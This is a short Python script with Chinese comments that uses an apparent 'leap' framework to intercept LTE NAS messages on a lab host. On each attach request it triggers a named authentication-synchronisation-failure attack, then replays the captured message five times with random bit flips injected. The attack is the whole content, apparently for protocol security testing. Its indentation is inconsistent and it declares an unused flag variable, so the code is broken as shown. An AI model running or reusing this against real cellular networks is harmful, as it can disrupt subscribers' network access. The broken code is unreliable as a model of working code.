#coding=utf-8

#初始化
from leap import *
from leap.message_def import *
from leap.ittimsg_def import *
from leap.command_def import *
from leap.leapmessage_def import *
from leap.func import *

import time
import random

buf_size = 4096

flag = 0 # 使用flag变量，保证只重放第一个收到的ATTACH_REQUEST，其后的正常处理

#建立连接
le = leap("192.168.137.99", "7897")

while True:
    #接收消息
    message_id, ue_id, length, msg = le.recv(buf_size)
    
    #用户自定义
    if message_id == LEAP_ITTI_MSG:
        le.hold(True)
    
    elif message_id == LEAP_INITIAL_NAS_DATA:
        nas_msg = le.nas_message_decode(msg)
        message_type = nas_msg.contents.header.message_type
        
		if message_type == ATTACH_REQUEST:
		        le.auth_sync_failure_attack()
		
                print("sending start ...")
                for y in range(5):
                    modified_msg = msg[:13] + chr(0x80 >> random.randint(0, 7)) + chr(0x80 >> random.randint(0, 7)) + msg[15:]
                    le.send(modified_msg)
                    print(str(y) + "completed")
   
                print("sending end")
				le.exit_loop()
    
    else:
        le.exit_loop()
